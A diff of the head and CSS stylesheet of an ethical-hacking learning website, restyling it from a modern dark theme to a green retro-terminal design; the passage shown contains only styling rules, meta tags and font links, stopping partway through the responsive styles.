@@ -1,557 +1,1269 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-  <meta name="description" content="KritanSec - World's Most Comprehensive Free Ethical Hacking Learning Platform. Created by Kritan Basnet (Anjan Basnet) - Education for Everyone">
-  <meta name="author" content="Kritan Basnet (Anjan Basnet)">
-  <meta name="keywords" content="ethical hacking, cybersecurity, free learning, penetration testing, hacking tools, CTF, bug bounty">
-  <meta name="theme-color" content="#0a0c10">
-  <title>KritanSec | World's Free Ethical Hacking University</title>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Kritan.sec</title>
+<link href="https://fonts.googleapis.com/css2?family=VT323&family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;600;700&display=swap" rel="stylesheet">
+<style>
+:root{
+  --g:#00ff41;--gd:#00cc33;--gdark:#003311;
+  --bg:#010801;--bg2:#030d03;--surf:#071207;--surf2:#0c1a0c;
+  --txt:#b8f5b8;--dim:#4a8a4a;--border:#112011;
+  --red:#ff2222;--yel:#ffcc00;--cyan:#00ffee;--mag:#ff00ff;
+  --wid:1200px;
+}
+*{margin:0;padding:0;box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+body{
+  font-family:'Rajdhani',sans-serif;
+  background:var(--bg);color:var(--txt);
+  overflow-x:hidden;cursor:crosshair;
+}
+::-webkit-scrollbar{width:4px;}
+::-webkit-scrollbar-track{background:var(--bg);}
+::-webkit-scrollbar-thumb{background:var(--g);}
 
-    :root {
-      --bg-primary: #0a0c10;
-      --bg-secondary: #0f1117;
-      --bg-card: #11141c;
-      --bg-elevated: #1a1d26;
-      --border-color: #2a2f3c;
-      --accent-primary: #00d9ff;
-      --accent-secondary: #ff006e;
-      --accent-green: #00ff9d;
-      --text-primary: #ffffff;
-      --text-secondary: #b0b8d0;
-      --glow: rgba(0, 217, 255, 0.3);
-    }
+/* CANVAS BG */
+#bg-canvas{position:fixed;top:0;left:0;width:100%;height:100%;z-index:0;opacity:0.06;pointer-events:none;}
 
-    body {
-      font-family: 'Inter', sans-serif;
-      background: var(--bg-primary);
-      color: var(--text-primary);
-      line-height: 1.6;
-      overflow-x: hidden;
-    }
+/* SCAN LINES */
+body::after{content:'';position:fixed;top:0;left:0;width:100%;height:100%;
+  background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,0.12) 2px,rgba(0,0,0,0.12) 4px);
+  pointer-events:none;z-index:998;}
 
-    /* Custom Scrollbar */
-    ::-webkit-scrollbar { width: 10px; }
-    ::-webkit-scrollbar-track { background: var(--bg-secondary); }
-    ::-webkit-scrollbar-thumb { background: var(--accent-primary); border-radius: 5px; }
+/* NOISE OVERLAY */
+body::before{content:'';position:fixed;top:0;left:0;width:100%;height:100%;
+  background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)' opacity='0.03'/%3E%3C/svg%3E");
+  pointer-events:none;z-index:997;opacity:0.4;}
 
-    /* Header Premium */
-    .sticky-header {
-      position: sticky;
-      top: 0;
-      background: rgba(10, 12, 16, 0.98);
-      backdrop-filter: blur(20px);
-      border-bottom: 1px solid var(--border-color);
-      z-index: 1000;
-      padding: 1rem 2rem;
-      display: flex;
-      flex-wrap: wrap;
-      align-items: center;
-      justify-content: space-between;
-      gap: 1rem;
-    }
+/* ── NAV ── */
+nav{
+  position:fixed;top:0;left:0;right:0;z-index:200;
+  background:rgba(1,8,1,0.95);backdrop-filter:blur(20px);
+  border-bottom:1px solid var(--gdark);
+  display:flex;align-items:center;justify-content:space-between;
+  padding:0 2.5rem;height:58px;
+}
+.nav-brand{
+  font-family:'VT323',monospace;font-size:1.6rem;color:var(--g);
+  text-shadow:0 0 20px var(--g),0 0 40px rgba(0,255,65,0.3);
+  letter-spacing:2px;display:flex;align-items:center;gap:10px;
+}
+.nav-brand .blink{animation:blink 1s step-end infinite;}
+@keyframes blink{50%{opacity:0}}
+.nav-links{display:flex;gap:1.8rem;list-style:none;}
+.nav-links a{
+  font-family:'Share Tech Mono',monospace;color:var(--dim);
+  text-decoration:none;font-size:0.75rem;letter-spacing:1.5px;
+  transition:color 0.2s,text-shadow 0.2s;
+}
+.nav-links a:hover{color:var(--g);text-shadow:0 0 8px var(--g);}
+.nav-status{
+  font-family:'Share Tech Mono',monospace;font-size:0.65rem;
+  color:var(--g);display:flex;align-items:center;gap:6px;
+}
+.pulse{width:7px;height:7px;border-radius:50%;background:var(--g);
+  box-shadow:0 0 8px var(--g);animation:pulse 2s ease-in-out infinite;}
+@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:0.6;transform:scale(0.85)}}
 
-    .logo-area h1 {
-      font-size: 1.6rem;
-      font-weight: 800;
-      background: linear-gradient(135deg, var(--accent-primary), var(--accent-secondary), var(--accent-green));
-      background-clip: text;
-      -webkit-background-clip: text;
-      color: transparent;
-      letter-spacing: -0.5px;
-    }
-    .logo-area p {
-      font-size: 0.7rem;
-      color: var(--text-secondary);
-    }
+/* ── HERO ── */
+#hero{
+  position:relative;z-index:1;min-height:100vh;
+  display:flex;flex-direction:column;align-items:center;justify-content:center;
+  text-align:center;padding:80px 2rem 3rem;
+}
+.hero-eyebrow{
+  font-family:'Share Tech Mono',monospace;font-size:0.68rem;
+  letter-spacing:6px;color:var(--dim);margin-bottom:1.5rem;
+  animation:fadeUp 0.8s ease both;
+}
+.glitch-name{
+  font-family:'VT323',monospace;
+  font-size:clamp(3rem,10vw,7rem);
+  color:var(--g);line-height:1;
+  text-shadow:0 0 30px var(--g),0 0 60px rgba(0,255,65,0.4);
+  position:relative;animation:fadeUp 0.9s 0.1s ease both;
+  letter-spacing:4px;
+}
+.glitch-name::before,.glitch-name::after{
+  content:attr(data-text);position:absolute;top:0;left:0;width:100%;
+}
+.glitch-name::before{
+  color:var(--cyan);clip:rect(0,900px,0,0);
+  animation:glitch1 3s infinite linear alternate-reverse;
+  text-shadow:2px 0 var(--cyan);
+}
+.glitch-name::after{
+  color:var(--mag);clip:rect(0,900px,0,0);
+  animation:glitch2 3s infinite linear alternate-reverse;
+  text-shadow:-2px 0 var(--mag);
+}
+@keyframes glitch1{
+  0%,90%,100%{clip:rect(0,0,0,0)}
+  91%{clip:rect(20px,9999px,30px,0)}
+  93%{clip:rect(60px,9999px,75px,0)}
+  95%{clip:rect(10px,9999px,20px,0)}
+  97%{clip:rect(80px,9999px,95px,0)}
+}
+@keyframes glitch2{
+  0%,88%,100%{clip:rect(0,0,0,0)}
+  89%{clip:rect(40px,9999px,55px,0)}
+  91%{clip:rect(5px,9999px,15px,0)}
+  94%{clip:rect(70px,9999px,85px,0)}
+}
+.hero-subtitle{
+  font-family:'Share Tech Mono',monospace;
+  font-size:clamp(0.8rem,2vw,1rem);
+  color:var(--dim);letter-spacing:3px;margin:1rem 0 0.5rem;
+  animation:fadeUp 1s 0.2s ease both;
+}
+.hero-tag{
+  font-family:'Share Tech Mono',monospace;font-size:0.72rem;
+  color:var(--yel);letter-spacing:2px;margin-bottom:2rem;
+  animation:fadeUp 1s 0.25s ease both;
+}
+.hero-tag span{color:var(--g);}
 
-    .free-badge {
-      background: linear-gradient(135deg, var(--accent-green), var(--accent-primary));
-      padding: 0.3rem 1rem;
-      border-radius: 40px;
-      font-weight: bold;
-      color: #000;
-      animation: pulse 2s infinite;
-    }
-    @keyframes pulse {
-      0%, 100% { opacity: 1; transform: scale(1); }
-      50% { opacity: 0.8; transform: scale(1.05); }
-    }
+/* TYPEWRITER */
+.typewriter-wrap{
+  font-family:'VT323',monospace;font-size:1.6rem;
+  color:var(--g);text-shadow:0 0 10px var(--g);
+  margin-bottom:2.5rem;animation:fadeUp 1s 0.3s ease both;
+  height:2.2rem;
+}
+#typewriter{display:inline;}
+#tw-cursor{display:inline-block;width:12px;height:1.4rem;background:var(--g);vertical-align:middle;animation:blink 0.8s step-end infinite;}
 
-    .search-container {
-      flex: 1;
-      max-width: 380px;
-    }
-    .search-box {
-      display: flex;
-      align-items: center;
-      background: var(--bg-secondary);
-      border-radius: 40px;
-      padding: 0.5rem 1.2rem;
-      border: 1px solid var(--border-color);
-    }
-    .search-box:focus-within {
-      border-color: var(--accent-primary);
-      box-shadow: 0 0 0 3px var(--glow);
-    }
-    .search-box input {
-      background: transparent;
-      border: none;
-      width: 100%;
-      color: var(--text-primary);
-      outline: none;
-    }
+.hero-btns{display:flex;gap:1rem;flex-wrap:wrap;justify-content:center;animation:fadeUp 1s 0.4s ease both;margin-bottom:3rem;}
 
-    /* Layout */
-    .main-layout {
-      display: flex;
-    }
+/* TERMINAL BOX */
+.term{
+  background:rgba(7,18,7,0.9);border:1px solid var(--border);
+  border-radius:2px;max-width:720px;width:100%;margin:0 auto;
+  box-shadow:0 0 60px rgba(0,255,65,0.1),inset 0 0 30px rgba(0,0,0,0.5);
+  animation:fadeUp 1s 0.35s ease both;
+}
+.term-bar{
+  background:var(--surf2);padding:10px 16px;
+  display:flex;align-items:center;gap:8px;
+  border-bottom:1px solid var(--border);
+}
+.td{width:11px;height:11px;border-radius:50%;}
+.td.r{background:#ff5f56;}.td.y{background:#ffbd2e;}.td.g{background:#27c93f;}
+.term-title{font-family:'Share Tech Mono',monospace;font-size:0.68rem;color:var(--dim);margin-left:auto;letter-spacing:2px;}
+.term-body{padding:20px 24px;font-family:'Share Tech Mono',monospace;font-size:0.8rem;line-height:2;}
+.tc{color:var(--g);}.to{color:var(--txt);}.tcom{color:#2a5a2a;}.tw{color:var(--yel);}
+.tcur{display:inline-block;width:8px;height:13px;background:var(--g);animation:blink 1s step-end infinite;vertical-align:middle;}
 
-    .sidebar {
-      width: 280px;
-      background: var(--bg-secondary);
-      border-right: 1px solid var(--border-color);
-      position: sticky;
-      top: 70px;
-      height: calc(100vh - 70px);
-      overflow-y: auto;
-      padding: 2rem 1rem;
-    }
-    .sidebar nav ul { list-style: none; }
-    .sidebar nav li { margin-bottom: 0.3rem; }
-    .sidebar nav a {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      padding: 0.7rem 1rem;
-      border-radius: 12px;
-      color: var(--text-secondary);
-      text-decoration: none;
-      transition: all 0.2s;
-    }
-    .sidebar nav a:hover, .sidebar nav a.active {
-      background: linear-gradient(90deg, rgba(0,217,255,0.1), transparent);
-      color: var(--accent-primary);
-    }
-    .sidebar nav a i { width: 24px; }
+.hero-stats{
+  display:flex;gap:3rem;flex-wrap:wrap;justify-content:center;
+  animation:fadeUp 1s 0.5s ease both;
+}
+.stat-n{font-family:'Orbitron',monospace;font-size:2.2rem;font-weight:700;color:var(--g);text-shadow:0 0 20px var(--g);}
+.stat-l{font-size:0.72rem;color:var(--dim);letter-spacing:3px;margin-top:4px;}
 
-    .content {
-      flex: 1;
-      padding: 2rem;
-      max-width: calc(100% - 280px);
-    }
+@keyframes fadeUp{from{opacity:0;transform:translateY(24px)}to{opacity:1;transform:translateY(0)}}
 
-    .section-card {
-      background: var(--bg-card);
-      border-radius: 28px;
-      border: 1px solid var(--border-color);
-      padding: 2rem;
-      margin-bottom: 2rem;
-      scroll-margin-top: 80px;
-      transition: all 0.3s;
-    }
-    .section-card:hover {
-      border-color: var(--accent-primary);
-      box-shadow: 0 10px 40px rgba(0,217,255,0.1);
-    }
-    .section-title {
-      font-size: 1.8rem;
-      font-weight: 700;
-      margin-bottom: 1.5rem;
-      border-left: 4px solid var(--accent-primary);
-      padding-left: 1rem;
-    }
+/* BTN */
+.btn{
+  font-family:'Share Tech Mono',monospace;font-size:0.78rem;
+  letter-spacing:2px;padding:12px 28px;border:none;cursor:pointer;
+  text-decoration:none;display:inline-block;transition:all 0.25s;
+}
+.btn-g{background:var(--g);color:#000;font-weight:bold;box-shadow:0 0 20px rgba(0,255,65,0.35);}
+.btn-g:hover{box-shadow:0 0 40px rgba(0,255,65,0.7);transform:translateY(-2px);}
+.btn-o{background:transparent;color:var(--g);border:1px solid var(--g);}
+.btn-o:hover{background:rgba(0,255,65,0.08);transform:translateY(-2px);}
+.btn-r{background:transparent;color:var(--red);border:1px solid var(--red);}
+.btn-r:hover{background:rgba(255,34,34,0.08);transform:translateY(-2px);}
 
-    /* Grid Systems */
-    .resource-grid, .method-grid, .tool-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
-      gap: 1.5rem;
-      margin-top: 1rem;
-    }
-    .resource-card, .method-card {
-      background: var(--bg-elevated);
-      border-radius: 20px;
-      padding: 1.5rem;
-      border: 1px solid var(--border-color);
-      transition: all 0.2s;
-    }
-    .resource-card:hover, .method-card:hover {
-      transform: translateY(-4px);
-      border-color: var(--accent-primary);
-    }
-    .resource-card h3, .method-card h3 {
-      color: var(--accent-primary);
-      margin-bottom: 0.75rem;
-      font-size: 1.2rem;
-    }
-    .btn-link {
-      display: inline-block;
-      margin-top: 1rem;
-      color: var(--accent-green);
-      text-decoration: none;
-      font-weight: 600;
-    }
-    .btn-link:hover { text-decoration: underline; }
+/* ── DIVIDER ── */
+.divider{height:1px;background:linear-gradient(90deg,transparent,var(--gdark),transparent);margin:0;}
 
-    .code-block {
-      background: #010409;
-      border-radius: 14px;
-      padding: 1rem;
-      margin: 0.75rem 0;
-      border-left: 3px solid var(--accent-primary);
-      overflow-x: auto;
-      position: relative;
-    }
-    .code-block pre { font-family: monospace; font-size: 0.8rem; }
-    .copy-btn {
-      position: absolute;
-      top: 8px;
-      right: 12px;
-      background: var(--bg-elevated);
-      border: none;
-      padding: 4px 12px;
-      border-radius: 8px;
-      cursor: pointer;
-      font-size: 0.7rem;
-      color: var(--text-primary);
-    }
-    .copy-btn:hover { background: var(--accent-primary); }
+/* ── SECTION COMMON ── */
+section{position:relative;z-index:1;padding:80px 2rem;}
+.container{max-width:var(--wid);margin:0 auto;}
+.sh{text-align:center;margin-bottom:3.5rem;}
+.stag{font-family:'Share Tech Mono',monospace;font-size:0.68rem;letter-spacing:5px;color:var(--g);display:block;margin-bottom:0.8rem;}
+.st{font-family:'Orbitron',monospace;font-size:clamp(1.5rem,4vw,2.4rem);font-weight:700;color:#fff;margin-bottom:0.8rem;}
+.ss{color:var(--dim);font-size:0.95rem;max-width:520px;margin:0 auto;line-height:1.7;}
 
-    .about-section {
-      background: linear-gradient(135deg, rgba(0,217,255,0.1), rgba(255,0,110,0.1));
-      border-radius: 28px;
-      padding: 2rem;
-      text-align: center;
-      margin-bottom: 2rem;
-    }
-    .contact-btn {
-      background: var(--accent-primary);
-      color: #000;
-      padding: 0.8rem 1.5rem;
-      border-radius: 40px;
-      text-decoration: none;
-      font-weight: bold;
-      display: inline-block;
-      margin-top: 1rem;
-    }
+/* ── ABOUT / FOUNDER ── */
+#about{background:var(--bg2);}
+.about-grid{display:grid;grid-template-columns:1fr 1.5fr;gap:4rem;align-items:start;}
+.about-card{
+  background:var(--surf);border:1px solid var(--border);
+  border-top:3px solid var(--g);padding:2rem;position:relative;
+  box-shadow:0 0 40px rgba(0,255,65,0.06);
+}
+.about-card::before{
+  content:'[ FOUNDER.EXE ]';position:absolute;top:-13px;left:20px;
+  background:var(--surf);padding:0 10px;
+  font-family:'Share Tech Mono',monospace;font-size:0.65rem;color:var(--g);letter-spacing:3px;
+}
+.avatar-ring{
+  width:110px;height:110px;border-radius:50%;
+  border:2px solid var(--g);
+  box-shadow:0 0 30px rgba(0,255,65,0.3);
+  display:flex;align-items:center;justify-content:center;
+  font-size:3.5rem;margin:0 auto 1.5rem;
+  background:var(--surf2);position:relative;
+}
+.avatar-ring::after{
+  content:'';position:absolute;inset:-6px;border-radius:50%;
+  border:1px solid var(--gdark);animation:spin 8s linear infinite;
+  border-top-color:var(--g);
+}
+@keyframes spin{to{transform:rotate(360deg)}}
+.founder-name{font-family:'Orbitron',monospace;font-size:1.4rem;font-weight:700;color:var(--g);text-align:center;text-shadow:0 0 15px var(--g);}
+.founder-alias{font-family:'Share Tech Mono',monospace;font-size:0.75rem;color:var(--dim);text-align:center;letter-spacing:3px;margin:4px 0 1.2rem;}
+.skill-bars{margin-top:1.5rem;}
+.sbar-label{display:flex;justify-content:space-between;margin-bottom:4px;}
+.sbar-label span{font-family:'Share Tech Mono',monospace;font-size:0.72rem;color:var(--dim);}
+.sbar-label .pct{color:var(--g);}
+.sbar-track{height:4px;background:var(--border);border-radius:2px;margin-bottom:12px;overflow:hidden;}
+.sbar-fill{height:100%;background:linear-gradient(90deg,var(--gdark),var(--g));border-radius:2px;transition:width 1.5s ease;width:0;}
+.badges{display:flex;flex-wrap:wrap;gap:0.5rem;margin-top:1.2rem;}
+.badge{
+  font-family:'Share Tech Mono',monospace;font-size:0.65rem;
+  padding:4px 10px;border:1px solid var(--gdark);
+  color:var(--g);background:rgba(0,255,65,0.05);letter-spacing:1px;
+}
+.badge.r{color:var(--red);border-color:#5a1010;background:rgba(255,34,34,0.05);}
+.badge.y{color:var(--yel);border-color:#5a4a00;background:rgba(255,204,0,0.05);}
+.badge.c{color:var(--cyan);border-color:#005a55;background:rgba(0,255,238,0.05);}
 
-    @media (max-width: 768px) {
-      .main-layout { flex-direction: column; }
-      .sidebar { width: 100%; position: static; height: auto; }
-      .content { max-width: 100%; padding: 1rem; }
-    }
+.about-text p{color:var(--dim);line-height:1.9;margin-bottom:1.2rem;font-size:1rem;}
+.about-text p strong{color:var(--txt);}
+.about-text p .hi{color:var(--g);font-family:'Share Tech Mono',monospace;font-size:0.9rem;}
+.mission-box{
+  background:var(--surf);border:1px solid var(--border);border-left:3px solid var(--g);
+  padding:1.5rem;margin-top:1.5rem;
+}
+.mission-box h4{font-family:'Orbitron',monospace;font-size:0.85rem;color:var(--g);margin-bottom:0.8rem;letter-spacing:1px;}
+.mission-box p{font-size:0.92rem;color:var(--dim);line-height:1.7;margin:0;}
+.made-by{
+  margin-top:1.5rem;font-family:'Share Tech Mono',monospace;font-size:0.72rem;
+  color:var(--dim);border:1px solid var(--border);padding:12px 16px;
+  background:var(--surf2);letter-spacing:1px;
+}
+.made-by span{color:var(--g);}
 
-    .progress-bar {
-      height: 4px;
-      background: var(--bg-elevated);
-      border-radius: 2px;
-      margin-top: 1rem;
-      overflow: hidden;
-    }
-    .progress-fill {
-      height: 100%;
-      background: linear-gradient(90deg, var(--accent-primary), var(--accent-secondary));
-      width: 0%;
-    }
-    footer { text-align: center; padding: 2rem; color: var(--text-secondary); border-top: 1px solid var(--border-color); }
-  </style>
+/* ── STACK ── */
+#stack{background:var(--bg);}
+.stack-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:1rem;}
+.stack-card{
+  background:var(--surf);border:1px solid var(--border);
+  padding:1.8rem 1.5rem;text-align:center;
+  transition:all 0.3s;position:relative;overflow:hidden;cursor:default;
+}
+.stack-card::before{
+  content:'';position:absolute;top:0;left:0;right:0;height:2px;
+  background:linear-gradient(90deg,transparent,var(--g),transparent);
+  transform:translateX(-100%);transition:transform 0.5s;
+}
+.stack-card:hover::before{transform:translateX(0);}
+.stack-card:hover{border-color:var(--gdark);box-shadow:0 0 25px rgba(0,255,65,0.1);transform:translateY(-4px);}
+.si{font-size:2.5rem;margin-bottom:0.8rem;display:block;}
+.stack-card h3{font-family:'Orbitron',monospace;font-size:0.9rem;color:#fff;margin-bottom:0.5rem;}
+.stack-card p{font-size:0.82rem;color:var(--dim);line-height:1.6;}
+.stack-lvl{font-family:'Share Tech Mono',monospace;font-size:0.65rem;margin-top:0.8rem;letter-spacing:2px;}
+
+/* ── FREE RESOURCES ── */
+#free{background:var(--bg2);}
+.res-tabs{display:flex;gap:0;margin-bottom:2rem;border:1px solid var(--border);overflow:hidden;max-width:900px;margin:0 auto 2rem;}
+.res-tab{
+  flex:1;padding:12px;font-family:'Share Tech Mono',monospace;font-size:0.72rem;
+  letter-spacing:2px;text-align:center;cursor:pointer;
+  background:var(--surf);color:var(--dim);border:none;transition:all 0.2s;
+}
+.res-tab.active,.res-tab:hover{background:var(--g);color:#000;}
+.res-panels{max-width:900px;margin:0 auto;}
+.res-panel{display:none;}.res-panel.active{display:block;}
+.res-category{margin-bottom:2rem;}
+.res-cat-title{
+  font-family:'Orbitron',monospace;font-size:0.85rem;color:var(--g);
+  letter-spacing:2px;margin-bottom:1rem;padding-bottom:8px;
+  border-bottom:1px solid var(--border);
+}
+.res-list{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:0.8rem;}
+.res-link{
+  background:var(--surf);border:1px solid var(--border);
+  padding:1rem 1.2rem;display:flex;gap:12px;align-items:flex-start;
+  text-decoration:none;transition:all 0.2s;
+}
+.res-link:hover{border-color:var(--g);background:var(--surf2);box-shadow:0 0 15px rgba(0,255,65,0.08);}
+.res-icon{font-size:1.3rem;flex-shrink:0;margin-top:2px;}
+.res-info .res-name{font-family:'Share Tech Mono',monospace;font-size:0.8rem;color:var(--g);margin-bottom:3px;}
+.res-info .res-desc{font-size:0.78rem;color:var(--dim);line-height:1.5;}
+.res-info .res-free{font-family:'Share Tech Mono',monospace;font-size:0.6rem;color:#000;background:var(--g);padding:1px 7px;display:inline-block;margin-top:4px;letter-spacing:1px;}
+.res-info .res-free.partial{background:var(--yel);}
+
+/* ── ROADMAP ── */
+#roadmap{background:var(--bg);}
+.road-timeline{position:relative;max-width:900px;margin:0 auto;}
+.road-timeline::before{
+  content:'';position:absolute;left:30px;top:0;bottom:0;width:1px;
+  background:linear-gradient(180deg,var(--g) 0%,var(--gdark) 70%,transparent 100%);
+}
+.road-item{
+  display:flex;gap:2rem;margin-bottom:2.5rem;
+  opacity:0;transform:translateX(-25px);transition:all 0.7s;
+}
+.road-item.vis{opacity:1;transform:translateX(0);}
+.road-dot{
+  min-width:60px;height:60px;background:var(--surf);
+  border:1px solid var(--g);display:flex;align-items:center;justify-content:center;
+  font-family:'Orbitron',monospace;font-size:0.9rem;font-weight:700;
+  color:var(--g);text-shadow:0 0 10px var(--g);z-index:1;flex-shrink:0;
+}
+.road-body{background:var(--surf);border:1px solid var(--border);border-left:2px solid var(--g);padding:1.5rem;flex:1;}
+.road-body h3{font-family:'Orbitron',monospace;font-size:0.92rem;color:var(--g);margin-bottom:0.5rem;}
+.road-body p{color:var(--dim);font-size:0.88rem;line-height:1.7;margin-bottom:0.8rem;}
+.road-tags{display:flex;gap:0.4rem;flex-wrap:wrap;}
+.rtag{font-family:'Share Tech Mono',monospace;font-size:0.62rem;padding:2px 8px;border:1px solid var(--gdark);color:var(--g);background:rgba(0,255,65,0.04);letter-spacing:1px;}
+.road-links{margin-top:0.8rem;display:flex;flex-wrap:wrap;gap:0.5rem;}
+.rlink{
+  font-family:'Share Tech Mono',monospace;font-size:0.65rem;
+  color:var(--cyan);text-decoration:none;padding:3px 8px;
+  border:1px solid #005a55;background:rgba(0,255,238,0.04);
+  transition:all 0.2s;letter-spacing:1px;
+}
+.rlink:hover{background:rgba(0,255,238,0.1);border-color:var(--cyan);}
+
+/* ── MODULES ── */
+#modules{background:var(--bg2);}
+.mod-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(320px,1fr));gap:1.2rem;}
+.mod-card{
+  background:var(--surf);border:1px solid var(--border);
+  padding:1.8rem;position:relative;overflow:hidden;
+  transition:transform 0.3s,box-shadow 0.3s;cursor:pointer;
+}
+.mod-card:hover{transform:translateY(-4px);box-shadow:0 20px 40px rgba(0,0,0,0.6);}
+.mod-card::after{
+  content:'';position:absolute;bottom:0;left:0;right:0;height:1px;
+  background:var(--g);transform:scaleX(0);transition:transform 0.3s;
+}
+.mod-card:hover::after{transform:scaleX(1);}
+.mod-n{font-family:'Share Tech Mono',monospace;font-size:0.65rem;color:var(--dim);letter-spacing:3px;margin-bottom:0.6rem;}
+.mod-icon{font-size:2rem;margin-bottom:0.8rem;display:block;}
+.mod-card h3{font-family:'Orbitron',monospace;font-size:0.95rem;color:#fff;margin-bottom:0.6rem;}
+.mod-card p{font-size:0.85rem;color:var(--dim);line-height:1.7;margin-bottom:1rem;}
+.mod-meta{display:flex;justify-content:space-between;align-items:center;}
+.mod-les{font-family:'Share Tech Mono',monospace;font-size:0.65rem;color:var(--g);letter-spacing:1px;}
+.mod-lvl{font-family:'Share Tech Mono',monospace;font-size:0.6rem;padding:2px 8px;}
+.mod-lvl.beg{color:var(--g);border:1px solid var(--gdark);}
+.mod-lvl.int{color:var(--yel);border:1px solid #5a4a00;}
+.mod-lvl.adv{color:var(--red);border:1px solid #5a1010;}
+
+/* ── TOOLS ── */
+#tools{background:var(--bg);}
+.tools-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(190px,1fr));gap:0.8rem;}
+.tool{
+  background:var(--surf);border:1px solid var(--border);
+  padding:1.2rem;transition:all 0.25s;
+}
+.tool:hover{border-color:var(--g);background:var(--surf2);box-shadow:0 0 20px rgba(0,255,65,0.08);}
+.tool-name{font-family:'Share Tech Mono',monospace;font-size:0.85rem;color:var(--g);margin-bottom:3px;}
+.tool-cat{font-size:0.65rem;color:var(--dim);letter-spacing:2px;margin-bottom:5px;}
+.tool-desc{font-size:0.78rem;color:var(--dim);line-height:1.5;}
+.tool a{font-family:'Share Tech Mono',monospace;font-size:0.62rem;color:var(--cyan);text-decoration:none;margin-top:6px;display:inline-block;opacity:0.8;}
+.tool a:hover{opacity:1;}
+
+/* ── QUIZ ── */
+#quiz{background:var(--bg2);}
+.quiz-wrap{max-width:700px;margin:0 auto;background:var(--surf);border:1px solid var(--border);padding:2.5rem;box-shadow:0 0 50px rgba(0,255,65,0.07);}
+.qprog{font-family:'Share Tech Mono',monospace;font-size:0.72rem;color:var(--dim);margin-bottom:6px;}
+.qbar{height:2px;background:var(--border);margin-bottom:1.8rem;overflow:hidden;}
+.qbar-f{height:100%;background:var(--g);transition:width 0.5s;}
+.qq{font-family:'Orbitron',monospace;font-size:0.95rem;color:#fff;line-height:1.6;margin-bottom:1.5rem;}
+.qopts{display:flex;flex-direction:column;gap:0.7rem;margin-bottom:1.2rem;}
+.qopt{
+  background:var(--bg2);border:1px solid var(--border);padding:13px 16px;
+  font-family:'Share Tech Mono',monospace;font-size:0.8rem;color:var(--txt);
+  cursor:pointer;transition:all 0.2s;text-align:left;
+}
+.qopt:hover:not(:disabled){border-color:var(--g);color:var(--g);background:rgba(0,255,65,0.04);}
+.qopt.cor{border-color:var(--g);background:rgba(0,255,65,0.12);color:var(--g);}
+.qopt.wrg{border-color:var(--red);background:rgba(255,34,34,0.08);color:var(--red);}
+.qopt:disabled{cursor:default;}
+.qfb{font-size:0.87rem;padding:12px;margin-bottom:1rem;display:none;line-height:1.6;}
+.qfb.show{display:block;}
+.qfb.ok{background:rgba(0,255,65,0.07);border:1px solid var(--gdark);color:var(--g);}
+.qfb.no{background:rgba(255,34,34,0.07);border:1px solid #5a1010;color:var(--red);}
+.qctl{display:flex;justify-content:space-between;align-items:center;}
+.qsc{font-family:'Share Tech Mono',monospace;font-size:0.75rem;color:var(--dim);}
+.qsc span{color:var(--g);}
+
+/* ── ETHICS ── */
+#ethics{background:var(--bg);}
+.pledge{
+  max-width:780px;margin:0 auto;
+  border:1px solid var(--gdark);padding:3rem;
+  background:var(--surf);position:relative;
+}
+.pledge::before{
+  content:'[ ETHICAL PLEDGE — KRITAN ]';
+  position:absolute;top:-12px;left:50%;transform:translateX(-50%);
+  background:var(--surf);padding:0 14px;
+  font-family:'Share Tech Mono',monospace;font-size:0.65rem;color:var(--g);letter-spacing:3px;
+}
+.pledge p{color:var(--dim);font-size:0.95rem;line-height:1.9;margin-bottom:1rem;}
+.pledge ol{list-style:none;margin:1.5rem 0;}
+.pledge ol li{
+  padding:10px 0;border-bottom:1px solid var(--border);
+  font-size:0.9rem;color:var(--dim);display:flex;gap:14px;align-items:flex-start;
+}
+.pledge ol li:last-child{border-bottom:none;}
+.pn{font-family:'Orbitron',monospace;font-size:0.75rem;color:var(--g);min-width:24px;margin-top:2px;}
+.pledge .sig{font-family:'VT323',monospace;font-size:1.6rem;color:var(--g);text-shadow:0 0 10px var(--g);text-align:right;margin-top:1.5rem;}
+
+/* ── FOOTER ── */
+footer{
+  position:relative;z-index:1;background:var(--surf);
+  border-top:1px solid var(--border);padding:2.5rem 2rem;
+  text-align:center;
+}
+.foot-logo{font-family:'VT323',monospace;font-size:2rem;color:var(--g);text-shadow:0 0 20px var(--g);}
+footer p{font-size:0.83rem;color:var(--dim);margin:0.3rem 0;line-height:1.6;}
+.foot-warn{
+  color:var(--yel);font-family:'Share Tech Mono',monospace;font-size:0.68rem;
+  letter-spacing:1px;margin-top:1.5rem;border:1px solid #5a4a00;
+  padding:10px 20px;display:inline-block;background:rgba(255,204,0,0.04);
+}
+.foot-credit{
+  margin-top:1.5rem;font-family:'Share Tech Mono',monospace;font-size:0.7rem;
+  color:var(--dim);letter-spacing:2px;padding-top:1.5rem;border-top:1px solid var(--border);
+}
+.foot-credit span{color:var(--g);}
+
+/* ── RESPONSIVE ── */
+@media(max-width:768px){
+  .about-grid{grid-template-columns:1fr;}
+  .nav-links{display:none;}
+  nav{padding:0 1.2rem;}
+  .road-timeline::before{left:22px;}
